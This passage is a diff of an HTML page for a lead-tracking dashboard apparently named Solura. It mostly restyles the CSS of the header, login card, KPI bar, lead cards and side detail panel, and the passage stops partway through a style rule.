@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><!-- v6.0 --><html lang="en">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
@@ -7,1154 +7,1827 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="apple-mobile-web-app-title" content="Solura">
-<meta name="theme-color" content="#3A7DC9">
+<meta name="theme-color" content="#1C3A6E">
 <link rel="manifest" href="manifest.json">
 <link rel="apple-touch-icon" href="logo.png">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600&amp;family=Plus+Jakarta+Sans:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
+/* ── Reset & Variables ───────────────────────────────────────────── */
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --gold:#C8870A;--gold-light:#E8A020;--gold-pale:#FEF7E8;--gold-mid:#F0C46A;
-  --sky:#5B9BD5;--sky-deep:#3A7DC9;--sky-pale:#EBF3FB;--sky-mid:#9DC4E8;
-  --grn:#4A8C3F;--grn-pale:#EDF5EC;--grn-mid:#A8D8A0;
-  --warm:#FDFCF9;--cream:#F4EFE6;--dark:#1A1A1A;--mid:#4A4A4A;--soft:#9A9A9A;--border:#E2D9CC;
-  --red:#C0392B;--red-pale:#FEF0EE;--red-mid:#F5C6C0;
-  --shadow:0 2px 16px rgba(0,0,0,.07);--drawer-w:380px;
+  --gold:#B8751A;
+  --gold-light:#D4972A;
+  --gold-pale:#FEF3E8;
+  --gold-mid:#F0C070;
+  --navy:#1C3A6E;
+  --navy-mid:#2A5298;
+  --sky:#3A80D2;
+  --sky-pale:#EBF3FB;
+  --sky-mid:#9DC4E8;
+  --grn:#2E7D32;
+  --grn-pale:#F0FDF4;
+  --grn-mid:#86EFAC;
+  --red:#B91C1C;
+  --red-pale:#FEF2F2;
+  --red-mid:#FCA5A5;
+  --cream:#F4EFE6;
+  --warm:#FDFCF9;
+  --dark:#1A1A1A;
+  --mid:#4A4A4A;
+  --soft:#888;
+  --border:#E8DFD0;
+  --border-strong:#D4C8B8;
+  --shadow:0 2px 16px rgba(0,0,0,.07);
+  --shadow-lg:0 8px 32px rgba(0,0,0,.12);
+  --panel-w:340px;
+  --hdr-h:58px;
 }
-body{font-family:'Plus Jakarta Sans',sans-serif;background:var(--cream);color:var(--dark);min-height:100vh;overflow-x:hidden}
-body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(circle,rgba(200,135,10,.09) 1.5px,transparent 1.5px);background-size:28px 28px;pointer-events:none;z-index:0}
+body{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  background:var(--cream);
+  color:var(--dark);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:radial-gradient(circle,rgba(184,117,26,.07) 1.5px,transparent 1.5px);
+  background-size:28px 28px;pointer-events:none;z-index:0;
+}
+a{color:inherit;text-decoration:none}
+button{font-family:'Plus Jakarta Sans',sans-serif;cursor:pointer;transition:all .15s}
 
-/* Header */
-.hdr{background:var(--sky-deep);height:66px;padding:0 32px;display:flex;align-items:center;justify-content:space-between;border-bottom:3px solid var(--gold);position:sticky;top:0;z-index:200;box-shadow:0 3px 20px rgba(0,0,0,.25)}
+/* ── Header ─────────────────────────────────────────────────────── */
+.hdr{
+  position:sticky;top:0;z-index:200;
+  height:var(--hdr-h);
+  background:var(--navy);
+  border-bottom:2.5px solid var(--gold);
+  padding:0 28px;
+  display:flex;align-items:center;justify-content:space-between;
+  box-shadow:0 3px 20px rgba(0,0,0,.2);
+}
 .hdr-l{display:flex;align-items:center;gap:12px}
-.logo-wrap{width:48px;height:48px;border-radius:50%;border:2px solid var(--gold);overflow:hidden;flex-shrink:0;background:var(--gold);display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(200,135,10,.25)}
+.logo-wrap{
+  width:40px;height:40px;border-radius:50%;
+  border:1.5px solid var(--gold);
+  background:var(--gold);
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;flex-shrink:0;
+}
 .logo-wrap img{width:100%;height:100%;object-fit:cover}
-.logo-s{font-family:'Cormorant Garamond',serif;font-size:22px;font-weight:600;color:#fff}
-.brand{font-family:'Cormorant Garamond',serif;font-size:22px;font-weight:500;color:var(--gold);letter-spacing:.02em}
-.hdr-r{display:flex;align-items:center;gap:10px}
-.sync-pill{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.18);border-radius:20px;padding:5px 12px;font-size:11px;color:rgba(255,255,255,.8)}
-.sdot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.35);flex-shrink:0}
-.sdot.live{background:#5DCC7A;box-shadow:0 0 6px #5DCC7A}
-.hbtn{padding:7px 16px;border:none;border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;white-space:nowrap}
-.hbtn-gold{background:var(--gold);color:#fff}.hbtn-gold:hover{background:var(--gold-light)}
-.hbtn-ghost{background:rgba(255,255,255,.12);color:rgba(255,255,255,.85);border:1px solid rgba(255,255,255,.2)}.hbtn-ghost:hover{background:rgba(255,255,255,.2);color:#fff}
+.logo-s{font-family:'Cormorant Garamond',serif;font-size:18px;font-weight:600;color:#fff}
+.brand{font-family:'Cormorant Garamond',serif;font-size:21px;font-weight:500;color:var(--gold-light);letter-spacing:.02em}
+.hdr-r{display:flex;align-items:center;gap:9px}
+.sync-pill{
+  display:flex;align-items:center;gap:6px;
+  background:rgba(255,255,255,.1);
+  border:1px solid rgba(255,255,255,.15);
+  border-radius:20px;padding:4px 12px;
+  font-size:11px;color:rgba(255,255,255,.7);
+}
+.s-dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.3);flex-shrink:0;transition:all .3s}
+.s-dot.live{background:#3ED67A;box-shadow:0 0 6px #3ED67A}
+.hbtn{
+  padding:6px 16px;border:none;border-radius:8px;
+  font-size:12px;font-weight:600;white-space:nowrap;
+}
+.hbtn-gold{background:var(--gold);color:#fff}
+.hbtn-gold:hover{background:var(--gold-light)}
+.hbtn-ghost{background:rgba(255,255,255,.1);color:rgba(255,255,255,.8);border:1px solid rgba(255,255,255,.18)}
+.hbtn-ghost:hover{background:rgba(255,255,255,.18);color:#fff}
 
-/* Login */
-#ls{min-height:calc(100vh - 66px);display:flex;align-items:center;justify-content:center;padding:40px;position:relative;z-index:1}
-.lcard{background:var(--warm);border-radius:24px;padding:48px;max-width:460px;width:100%;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border)}
-.llogo{width:80px;height:80px;border-radius:50%;border:3px solid var(--gold);overflow:hidden;margin:0 auto 20px;background:var(--gold);display:flex;align-items:center;justify-content:center}
-.llogo img{width:100%;height:100%;object-fit:cover}
-.llogo-s{font-family:'Cormorant Garamond',serif;font-size:32px;font-weight:600;color:#fff}
-.ltitle{font-family:'Cormorant Garamond',serif;font-size:28px;font-weight:500;margin-bottom:6px}
-.lsub{font-size:14px;color:var(--soft);line-height:1.6;margin-bottom:28px}
-.lsub strong{color:var(--mid)}
-.flabel{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--soft);text-align:left;display:block;margin-bottom:6px}
-.frow{display:flex;gap:8px;margin-bottom:16px}
-.frow input{flex:1;padding:11px 14px;border:1.5px solid var(--border);border-radius:10px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;outline:none;background:var(--cream);transition:border-color .2s}
-.frow input:focus{border-color:var(--gold);background:#fff}
-.msbtn{width:100%;padding:14px;background:var(--sky-deep);color:#fff;border:none;border-radius:12px;font-family:'Plus Jakarta Sans',sans-serif;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all .2s}
-.msbtn:hover{background:var(--sky);transform:translateY(-1px)}
-.lnote{font-size:11px;color:var(--soft);margin-top:14px}
+/* ── KPI Bar ─────────────────────────────────────────────────────── */
+.kbar{
+  display:none;
+  grid-template-columns:repeat(4,1fr);
+  background:var(--warm);
+  border-bottom:1px solid var(--border);
+  position:sticky;top:var(--hdr-h);z-index:100;
+}
+.kpi{
+  padding:14px 24px;border-right:1px solid var(--border);
+  position:relative;overflow:hidden;transition:background .15s;cursor:default;
+}
+.kpi:last-child{border-right:none}
+.kpi:hover{background:var(--gold-pale)}
+.k-lbl{font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--soft);margin-bottom:5px}
+.k-val{font-family:'Cormorant Garamond',serif;font-size:34px;font-weight:400;line-height:1}
+.k-sub{font-size:10px;margin-top:3px}
+.k-bar{position:absolute;bottom:0;left:0;right:0;height:2.5px}
+.kpi-r .k-val{color:var(--red)}.kpi-r .k-bar{background:var(--red)}.kpi-r .k-sub{color:var(--red)}
+.kpi-a .k-val{color:var(--gold)}.kpi-a .k-bar{background:var(--gold)}.kpi-a .k-sub{color:var(--gold)}
+.kpi-g .k-val{color:var(--grn)}.kpi-g .k-bar{background:var(--grn)}.kpi-g .k-sub{color:var(--grn)}
+.kpi-b .k-val{color:var(--navy-mid)}.kpi-b .k-bar{background:var(--sky)}.kpi-b .k-sub{color:var(--navy-mid)}
 
-/* KPI */
-.kbar{display:none;grid-template-columns:repeat(4,1fr);background:var(--warm);border-bottom:1px solid var(--border);position:relative;z-index:1}
-.kpi{padding:18px 28px;border-right:1px solid var(--border);position:relative;overflow:hidden;transition:background .2s}
-.kpi:last-child{border-right:none}.kpi:hover{background:var(--gold-pale)}
-.klbl{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--soft);margin-bottom:6px}
-.kval{font-family:'Cormorant Garamond',serif;font-size:36px;font-weight:600;line-height:1}
-.ksub{font-size:11px;color:var(--soft);margin-top:3px}
-.kbb{position:absolute;bottom:0;left:0;right:0;height:3px}
-.kr .kval{color:var(--red)}.kr .kbb{background:var(--red)}
-.kg .kval{color:var(--gold)}.kg .kbb{background:var(--gold)}
-.kgr .kval{color:var(--grn)}.kgr .kbb{background:var(--grn)}
-.ks .kval{color:var(--sky-deep)}.ks .kbb{background:var(--sky)}
+/* ── Login Screen ────────────────────────────────────────────────── */
+#login-screen{
+  min-height:calc(100vh - var(--hdr-h));
+  display:flex;align-items:center;justify-content:center;
+  padding:40px;position:relative;z-index:1;
+}
+.login-card{
+  background:var(--warm);border-radius:24px;
+  padding:44px 48px;max-width:440px;width:100%;
+  text-align:center;box-shadow:var(--shadow-lg);
+  border:1px solid var(--border);
+}
+.login-logo{
+  width:72px;height:72px;border-radius:50%;
+  border:2.5px solid var(--gold);background:var(--gold);
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 18px;overflow:hidden;
+}
+.login-logo img{width:100%;height:100%;object-fit:cover}
+.login-logo-s{font-family:'Cormorant Garamond',serif;font-size:30px;font-weight:600;color:#fff}
+.login-title{font-family:'Cormorant Garamond',serif;font-size:26px;font-weight:500;margin-bottom:6px}
+.login-sub{font-size:13px;color:var(--soft);line-height:1.6;margin-bottom:26px}
+.login-sub strong{color:var(--mid)}
+.f-label{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.09em;color:var(--soft);text-align:left;margin-bottom:5px}
+.f-input{
+  width:100%;padding:10px 13px;
+  border:1.5px solid var(--border);border-radius:10px;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;
+  outline:none;background:var(--cream);color:var(--dark);
+  transition:border-color .15s;margin-bottom:16px;
+}
+.f-input:focus{border-color:var(--gold);background:#fff}
+.login-btn{
+  width:100%;padding:13px;
+  background:var(--navy);color:#fff;border:none;
+  border-radius:12px;font-size:14px;font-weight:600;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  transition:all .2s;
+}
+.login-btn:hover{background:var(--navy-mid);transform:translateY(-1px)}
+.login-note{font-size:11px;color:var(--soft);margin-top:12px}
 
-/* Layout */
-.pw{display:flex;transition:padding-right .3s;position:relative;z-index:1}
-.pw.do{padding-right:var(--drawer-w)}
-.main{flex:1;padding:28px 36px;display:none;min-width:0}
-.main.vis{display:block}
-.tbar{display:flex;align-items:center;gap:10px;margin-bottom:24px;flex-wrap:wrap}
-.fpill{display:inline-flex;align-items:center;gap:7px;background:var(--warm);border:1px solid var(--border);border-radius:20px;padding:6px 14px;font-size:12px;color:var(--mid)}
-.fdot{width:7px;height:7px;background:var(--gold);border-radius:50%}
-.lref{font-size:12px;color:var(--soft);margin-left:auto}
-
-/* Sections */
-.sw{margin-bottom:28px}
-.shdr{display:flex;align-items:center;gap:10px;margin-bottom:12px;padding-bottom:10px;border-bottom:2px solid var(--border)}
-.sdot2{width:10px;height:10px;border-radius:50%;flex-shrink:0}
-.stitle{font-family:'Cormorant Garamond',serif;font-size:20px;font-weight:500}
-.scnt{margin-left:auto;font-size:11px;font-weight:700;padding:3px 11px;border-radius:20px}
-.sr .sdot2{background:var(--red)}.sr .stitle{color:var(--red)}.sr .scnt{background:var(--red-pale);color:var(--red);border:1px solid var(--red-mid)}
-.sa .sdot2{background:var(--gold)}.sa .stitle{color:var(--gold)}.sa .scnt{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
-.sg .sdot2{background:var(--grn)}.sg .stitle{color:var(--grn)}.sg .scnt{background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)}
-
-/* Table */
-.tc{background:var(--warm);border-radius:16px;border:1px solid var(--border);overflow:hidden;box-shadow:var(--shadow)}
-table{width:100%;border-collapse:collapse}
-thead tr{background:var(--sky-deep)}
-thead th{padding:11px 14px;font-size:10px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--gold);text-align:left;white-space:nowrap}
-tbody tr.dr{border-bottom:1px solid var(--border);transition:background .15s;cursor:pointer}
-tbody tr.dr:last-child{border-bottom:none}
-tbody tr.dr:hover{background:var(--gold-pale)}
-tbody tr.dr.sel{background:var(--gold-pale);border-left:3px solid var(--gold)}
-tbody tr.pr{border-bottom:1px solid var(--border)}
-tbody td{padding:12px 14px;font-size:13px;vertical-align:middle}
-.tn{font-weight:700;color:var(--dark);margin-bottom:1px}
-.ts{font-size:11px;color:var(--soft)}
-.tc2 a{font-size:12px;text-decoration:none;font-weight:500;display:block}
-.tc2 a.ph{color:var(--sky-deep)}.tc2 a.em{color:var(--grn)}.tc2 a:hover{text-decoration:underline}
-.badge{display:inline-block;font-size:11px;font-weight:700;padding:3px 9px;border-radius:20px;white-space:nowrap}
-.bn{background:#F0EFF4;color:#6B6980}
-.bc{background:var(--sky-pale);color:var(--sky-deep)}
-.bac{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
-.bas{background:#EAF0FB;color:#1A5276}
-.bna{background:#FEF0E6;color:#A04000}
-.bp{background:#F3EBF8;color:#7D3C98}
-.bng{background:var(--gold-pale);color:var(--gold)}
-.pill{display:inline-flex;font-size:12px;font-weight:700;padding:3px 10px;border-radius:20px;white-space:nowrap}
-.pr2{background:var(--red-pale);color:var(--red)}
-.pa{background:var(--gold-pale);color:var(--gold)}
-.pg{background:var(--grn-pale);color:var(--grn)}
-.empty{padding:32px;text-align:center;color:var(--soft);font-size:13px;font-style:italic}
-.spill{display:inline-flex;background:var(--gold-pale);color:var(--gold);border-radius:8px;padding:2px 8px;font-size:10px;font-weight:700;white-space:nowrap;margin-bottom:3px;border:1px solid var(--gold-mid)}
-.snxt{font-size:11px;color:var(--mid);margin-top:2px}
-
-/* Row buttons */
-.rbtns{display:flex;flex-direction:column;gap:5px;min-width:110px}
-.rb{padding:6px 12px;border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;white-space:nowrap;text-align:center}
-.rb-primary{padding:9px 14px;border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;white-space:nowrap;text-align:center;width:100%}
-.rb-small{padding:5px 10px;border-radius:7px;font-family:'Plus Jakarta Sans',sans-serif;font-size:10px;font-weight:600;cursor:pointer;transition:all .2s;white-space:nowrap;text-align:center}
-.rb-sec{padding:7px 12px;border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;white-space:nowrap;text-align:center}
-.rb-upd{background:var(--gold-pale);color:var(--gold);border:1.5px solid var(--gold-mid)}.rb-upd:hover,.rb-upd.on{background:var(--gold);color:#fff;border-color:var(--gold)}
-.rb-done{background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)}.rb-done:hover{background:var(--grn);color:#fff}
-.rb-resp{background:var(--sky-pale);color:var(--sky-deep);border:1px solid var(--sky-mid)}.rb-resp:hover{background:var(--sky-deep);color:#fff}
-
-/* Panels */
-.ep{display:none;border-top:2px solid var(--gold)}
-.ep.open{display:block}
-.ep-update{background:#FDFAF3}
-.ep-done{background:#F4FBF4}
-.ep-resp{background:#EBF3FB}
-.epi{padding:20px 24px}
-.ebanner{display:inline-block;font-size:12px;font-weight:700;padding:4px 12px;border-radius:8px;margin-bottom:14px}
-.eb-gold{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
-.eb-grn{background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)}
-.eb-sky{background:var(--sky-pale);color:var(--sky-deep);border:1px solid var(--sky-mid)}
-.etitle{font-family:'Cormorant Garamond',serif;font-size:17px;font-weight:500;color:var(--dark);margin-bottom:14px}
-.etitle span{color:var(--gold)}
-.egrid{display:grid;gap:12px;margin-bottom:14px}
-.g2{grid-template-columns:1fr 1fr}
-.g3{grid-template-columns:1fr 1fr 1fr}
-.g4{grid-template-columns:1fr 1fr 1fr 1fr}
-.ef{display:flex;flex-direction:column;gap:4px}
-.ef label{font-size:10px;font-weight:700;color:var(--soft);text-transform:uppercase;letter-spacing:.08em}
-.ef input,.ef select,.ef textarea{padding:9px 11px;border:1.5px solid var(--border);border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;outline:none;background:#fff;color:var(--dark);transition:border-color .2s}
-.ef input:focus,.ef select:focus,.ef textarea:focus{border-color:var(--gold)}
-.ef input:disabled{background:var(--cream);color:var(--soft)}
-.ef textarea{resize:vertical;min-height:64px}
-.eacts{display:flex;gap:8px;align-items:center;margin-top:4px}
-.esave{padding:9px 20px;background:var(--gold);color:#fff;border:none;border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s}
-.esave:hover{background:var(--gold-light);transform:translateY(-1px)}
-.esave:disabled{opacity:.5;cursor:not-allowed}
-.ecancel{padding:9px 16px;background:none;color:var(--soft);border:1.5px solid var(--border);border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;cursor:pointer}
-.esaving{font-size:12px;color:var(--soft);display:none;align-items:center;gap:6px}
-.esaving.on{display:flex}
-.mspin{width:13px;height:13px;border:2px solid var(--border);border-top-color:var(--gold);border-radius:50%;animation:spin .7s linear infinite}
+/* ── Spinner / Error ─────────────────────────────────────────────── */
+.spinner{
+  display:none;align-items:center;justify-content:center;
+  padding:80px;gap:14px;font-size:13px;color:var(--soft);
+  position:relative;z-index:1;
+}
+.spinner.on{display:flex}
+.spin-ring{
+  width:26px;height:26px;border:2.5px solid var(--border);
+  border-top-color:var(--gold);border-radius:50%;
+  animation:spin .7s linear infinite;
+}
 @keyframes spin{to{transform:rotate(360deg)}}
+.error-bar{
+  display:none;margin:12px 28px;padding:12px 16px;
+  background:var(--red-pale);border:1px solid var(--red-mid);
+  border-radius:10px;font-size:13px;color:var(--red);
+  position:relative;z-index:1;
+}
+.error-bar.on{display:block}
 
-/* Drawer */
-.drawer{position:fixed;top:66px;right:0;width:var(--drawer-w);height:calc(100vh - 66px);background:var(--warm);border-left:1px solid var(--border);z-index:150;transform:translateX(100%);transition:transform .3s cubic-bezier(.4,0,.2,1);overflow-y:auto;display:flex;flex-direction:column;box-shadow:-4px 0 24px rgba(0,0,0,.08)}
-.drawer.open{transform:translateX(0)}
-.dhb{background:var(--sky-deep);padding:18px 20px 16px;position:relative}
-.dname{font-family:'Cormorant Garamond',serif;font-size:22px;font-weight:500;color:var(--gold);padding-right:36px;line-height:1.2;margin-bottom:4px}
-.dclose{position:absolute;top:14px;right:14px;width:28px;height:28px;background:rgba(255,255,255,.15);border:none;border-radius:7px;cursor:pointer;font-size:15px;color:var(--gold);display:flex;align-items:center;justify-content:center;transition:all .2s}
-.dclose:hover{background:var(--gold);color:#fff}
-.dbody{padding:16px 20px;flex:1}
-.dsec{margin-bottom:18px;padding-bottom:18px;border-bottom:1px solid var(--border)}
-.dsec:last-child{border-bottom:none}
-.dsect{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--gold);margin-bottom:10px}
-.drow{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px}
-.drow:last-child{margin-bottom:0}
-.dlbl{font-size:11px;color:var(--soft);flex-shrink:0;width:110px}
-.dval{font-size:13px;color:var(--dark);font-weight:500;text-align:right;word-break:break-word;flex:1}
-.dval a{color:var(--sky-deep);text-decoration:none}.dval a.em{color:var(--grn)}.dval a:hover{text-decoration:underline}
-.dnotes{font-size:13px;color:var(--mid);line-height:1.6;background:var(--gold-pale);padding:10px 14px;border-radius:10px;white-space:pre-wrap;word-break:break-word}
-.dphase{display:inline-flex;align-items:center;background:var(--gold-pale);border:1px solid var(--gold-mid);border-radius:20px;padding:5px 14px;font-size:12px;font-weight:600;color:var(--gold)}
+/* ── Page Layout ─────────────────────────────────────────────────── */
+.page{
+  display:flex;position:relative;z-index:1;
+  transition:padding-right .3s cubic-bezier(.4,0,.2,1);
+}
+.page.panel-open{padding-right:var(--panel-w)}
 
-/* Toast */
-.toast{position:fixed;bottom:24px;right:calc(var(--drawer-w) + 16px);background:var(--dark);color:#fff;padding:12px 20px;border-radius:12px;font-size:13px;font-weight:500;box-shadow:0 8px 28px rgba(0,0,0,.25);transform:translateY(80px);opacity:0;transition:all .35s cubic-bezier(.34,1.56,.64,1);z-index:999;border-left:4px solid var(--gold);max-width:320px}
+/* ── Main Content ────────────────────────────────────────────────── */
+.main{flex:1;padding:24px 32px;display:none;min-width:0}
+.main.vis{display:block}
+.data-bar{display:flex;align-items:center;gap:10px;margin-bottom:20px;flex-wrap:wrap}
+.data-pill{
+  display:inline-flex;align-items:center;gap:6px;
+  background:var(--warm);border:1px solid var(--border);
+  border-radius:20px;padding:5px 13px;font-size:11px;color:var(--mid);
+}
+.data-dot{width:6px;height:6px;background:var(--gold);border-radius:50%}
+.data-ref{margin-left:auto;font-size:11px;color:var(--soft)}
+
+/* ── Sections ────────────────────────────────────────────────────── */
+.section{margin-bottom:24px}
+.section-hdr{
+  display:flex;align-items:center;gap:9px;
+  margin-bottom:11px;padding-bottom:9px;
+  border-bottom:1.5px solid var(--border);
+}
+.sec-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.sec-title{font-family:'Cormorant Garamond',serif;font-size:18px;font-weight:500}
+.sec-count{margin-left:auto;font-size:10px;font-weight:700;padding:2px 10px;border-radius:20px}
+.section-od .sec-dot{background:var(--red)}
+.section-od .sec-title{color:var(--red)}
+.section-od .sec-count{background:var(--red-pale);color:var(--red);border:1px solid var(--red-mid)}
+.section-td .sec-dot{background:var(--gold)}
+.section-td .sec-title{color:var(--gold)}
+.section-td .sec-count{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
+.section-wk .sec-dot{background:var(--grn)}
+.section-wk .sec-title{color:var(--grn)}
+.section-wk .sec-count{background:var(--grn-pale);color:var(--grn);border:1px solid var(--grn-mid)}
+.section-all .sec-dot{background:var(--soft)}
+.section-all .sec-title{color:var(--mid)}
+.section-all .sec-count{background:#F0EFF4;color:#6B6980;border:1px solid #DDDDE8}
+
+/* ── Lead Cards ──────────────────────────────────────────────────── */
+.card-wrap{border-radius:14px;overflow:hidden;box-shadow:var(--shadow);margin-bottom:8px}
+.lead-card{
+  background:var(--warm);border:1px solid var(--border);
+  border-radius:14px;cursor:pointer;transition:all .15s;
+  position:relative;overflow:hidden;
+}
+.lead-card::before{
+  content:'';position:absolute;left:0;top:0;bottom:0;
+  width:3px;background:transparent;transition:background .15s;
+}
+.lead-card:hover{border-color:var(--gold-mid);box-shadow:0 3px 16px rgba(184,117,26,.14)}
+.lead-card.sel{border-color:var(--gold);box-shadow:0 3px 18px rgba(184,117,26,.2)}
+.lead-card.sel::before{background:var(--gold)}
+.lead-card.urgency-od{border-left-color:var(--red)}
+.lead-card.urgency-od::before{background:var(--red)}
+.lead-card.urgency-td{border-left-color:var(--gold)}
+.lead-card.urgency-td::before{background:var(--gold)}
+.lead-card.urgency-od.sel::before,.lead-card.urgency-td.sel::before{background:var(--gold)}
+.card-body{padding:13px 16px}
+.card-row1{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:6px}
+.card-name{font-size:14px;font-weight:600;color:var(--dark);line-height:1.3}
+.card-row2{display:flex;align-items:center;gap:14px;margin-bottom:9px;flex-wrap:wrap}
+.c-link{font-size:11px;font-weight:500;display:inline-flex;align-items:center;gap:3px;color:var(--sky);transition:color .15s}
+.c-link:hover{color:var(--navy)}
+.c-link-em{color:var(--grn)}
+.c-link-em:hover{color:#1B5E20}
+.card-row3{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.card-pill{
+  display:inline-flex;align-items:center;
+  font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;
+  white-space:nowrap;flex-shrink:0;
+}
+.pill-od{background:var(--red-pale);color:var(--red)}
+.pill-td{background:var(--gold-pale);color:var(--gold)}
+.pill-wk{background:var(--grn-pale);color:var(--grn)}
+.pill-none{background:#F0EFF4;color:#6B6980}
+.card-nxt{font-size:11px;color:var(--mid);flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card-cta{
+  padding:6px 15px;border:none;border-radius:8px;
+  font-size:11px;font-weight:700;white-space:nowrap;flex-shrink:0;margin-left:auto;
+}
+.cta-call{background:var(--navy);color:#fff}
+.cta-call:hover{background:var(--navy-mid)}
+.cta-sms{background:var(--grn);color:#fff}
+.cta-sms:hover{background:#1B5E20}
+.cta-email{background:var(--gold);color:#fff}
+.cta-email:hover{background:var(--gold-light)}
+.cta-update{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
+.cta-update:hover{background:var(--gold);color:#fff}
+
+/* Status Badges */
+.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 9px;border-radius:20px;white-space:nowrap}
+.b-new{background:#F0EFF4;color:#6B6980}
+.b-contacted{background:var(--sky-pale);color:var(--navy-mid)}
+.b-active{background:var(--gold-pale);color:var(--gold);border:1px solid var(--gold-mid)}
+.b-noans{background:#FFF7ED;color:#9A3412}
+.b-assess{background:#EAF0FB;color:#1A5276}
+.b-proposal{background:#F3EBF8;color:#7D3C98}
+.b-neg{background:var(--gold-pale);color:var(--gold)}
+.b-other{background:#F0EFF4;color:#6B6980}
+
+/* Section empty */
+.sec-empty{padding:24px;text-align:center;color:var(--soft);font-size:12px;font-style:italic;background:var(--warm);border-radius:12px;border:1px solid var(--border)}
+
+/* ── Detail Panel ────────────────────────────────────────────────── */
+.panel{
+  position:fixed;top:var(--hdr-h);right:0;
+  width:var(--panel-w);height:calc(100vh - var(--hdr-h));
+  background:var(--warm);border-left:1px solid var(--border);
+  box-shadow:-4px 0 24px rgba(0,0,0,.09);
+  z-index:150;
+  transform:translateX(100%);
+  transition:transform .3s cubic-bezier(.4,0,.2,1);
+  display:flex;flex-direction:column;overflow:hidden;
+}
+.panel.open{transform:translateX(0)}
+.panel-hdr{
+  background:var(--navy);padding:18px 20px 16px;
+  position:relative;flex-shrink:0;border-bottom:2px solid var(--gold);
+}
+.panel-name{
+  font-family:'Cormorant Garamond',serif;font-size:22px;font-weight:500;
+  color:var(--gold-light);line-height:1.2;padding-right:34px;margin-bottom:4px;
+}
+.panel-meta{font-size:11px;color:rgba(255,255,255,.6);line-height:1.4}
+.panel-close{
+  position:absolute;top:14px;right:14px;
+  width:28px;height:28px;background:rgba(255,255,255,.12);
+  border:none;border-radius:7px;
+  font-size:16px;color:var(--gold-light);
+  display:flex;align-items:center;justify-content:center;
+}
+.panel-close:hover{background:var(--gold);color:#fff}
+.panel-body{flex:1;overflow-y:auto;padding:18px 20px}
+.panel-section{margin-bottom:18px;padding-bottom:18px;border-bottom:1px solid var(--border)}
+.panel-section:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.panel-sec-lbl{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:var(--gold);margin-bottom:10px}
+
+/* Next action box */
+.nxt-box{
+  background:var(--gold-pale);border:1px solid var(--gold-mid);
+  border-radius:10px;padding:11px 14px;margin-bottom:11px;
+}
+.nxt-step{font-size:13px;font-weight:600;color:var(--dark);margin-bottom:3px}
+.nxt-urgency{font-size:11px;color:var(--gold)}
+.nxt-urgency.od{color:var(--red)}
+.nxt-complete{font-size:12px;color:var(--grn);font-style:italic}
+
+/* Panel action buttons */
+.pact-row{display:flex;flex-direction:column;gap:7px}
+.pact{
+  padding:9px 14px;border:none;border-radius:9px;
+  font-size:12px;font-weight:600;text-align:left;
